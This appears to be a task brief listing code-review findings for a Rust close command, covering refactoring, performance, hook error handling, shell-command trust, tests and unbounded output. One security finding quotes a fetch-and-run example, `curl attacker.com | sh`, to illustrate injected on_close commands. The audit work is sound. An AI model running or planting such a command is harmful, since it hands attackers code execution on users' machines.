## Task
Improve `src/commands/close.rs` based on vibecheck findings.

## Findings (top 20)
- [high] single-responsibility — `src/commands/close.rs:262-670`
  - `cmd_close` is a ~400-line monolith doing verification, fail-first tracking, circuit breaker logic, on_fail processing, history recording, output capture, worktree merging, archiving, post-close hooks, on_close actions, worktree cleanup, and recursive auto-parent-closing — all in a single function with deeply nested control flow inside a `for id in &ids` loop.
  - Suggested fix: Extract into focused helpers: `run_and_record_verify()`, `process_verify_failure()`, `archive_bean()`, `process_on_close_actions()`, `handle_worktree_merge()`. The main loop should read as a sequence of named steps, not inline logic.
- [medium] performance — `src/commands/close.rs:121-146`
  - `all_children_closed` rebuilds the entire index from disk (`Index::build`) AND collects all archived beans on every call. This is called once per parent bean during auto-close, and `auto_close_parent` calls it recursively up the chain. For a 3-level deep hierarchy with many beans, this could mean 3+ full disk scans.
  - Suggested fix: Pass the already-loaded index into these functions rather than rebuilding it. For archived beans, maintain a set of known-closed IDs from the close operation context.
- [medium] error-handling — `src/commands/close.rs:293-306`
  - When `execute_hook(PreClose)` returns `Err(e)`, the error is logged to stderr and `pre_close_passed` is set to `true` — silently allowing the close to proceed even when the hook system itself failed (not a hook rejection, but an execution error like "hook not executable" or timeout). This conflates "hook didn't exist" with "hook infrastructure broke".
  - Suggested fix: Distinguish between "no hook configured" (pass), "hook ran and rejected" (block), and "hook execution error" (fail with error or configurable policy). At minimum, log a more prominent warning when an execution error occurs.
- [medium] input-validation — `src/commands/close.rs:331-340`
  - The `on_close: Run { command }` action executes an arbitrary shell command from bean YAML content via `sh -c`. While there is a trust check (`is_trusted`), the trust model is project-wide (a single `.hooks-trusted` file), not per-command. Any user or agent that can write to a bean's `on_close` field can execute arbitrary commands once trust is enabled. A compromised or malicious bean file could inject commands like `curl attacker.com | sh`.
  - Suggested fix: Consider validating or allowlisting on_close commands, or displaying the command and requiring explicit user confirmation before execution. At minimum, document this risk prominently in the trust command output and README.
- [low] test-quality — `src/commands/close.rs:700-2869`
  - The test section is ~2,170 lines — 75% of the file. While comprehensive, several test functions duplicate setup boilerplate (creating beans, setting up hooks with trust and permissions, configuring auto-close). The sheer volume makes the source file hard to navigate.
  - Suggested fix: Extract common test helpers (e.g., `create_bean_with_verify`, `setup_trusted_hook`, `setup_auto_close_config`) and consider moving tests to a separate `tests/close_test.rs` integration test file, similar to `tests/adopt_test.rs`.
- [low] edge-cases — `src/commands/close.rs:49-67`
  - `run_verify` captures both stdout and stderr into memory without size limits. A verify command that produces unbounded output (e.g., a test suite dumping a large binary diff, or a command that accidentally cats a large file) could cause memory exhaustion. The `MAX_OUTPUT_BYTES` constant only limits what gets stored in `bean.outputs`, not the initial capture.
  - Suggested fix: Use bounded output capture (e.g., `Command::output()` with a wrapper that limits total bytes read from child stdout/stderr), or pipe through a size-limited reader. Alternatively, kill the child process if output exceeds a reasonable limit (e.g., 10MB).

## Notes
- Keep behavior the same unless the finding explicitly calls for a behavior change.
- Prefer small, focused changes.
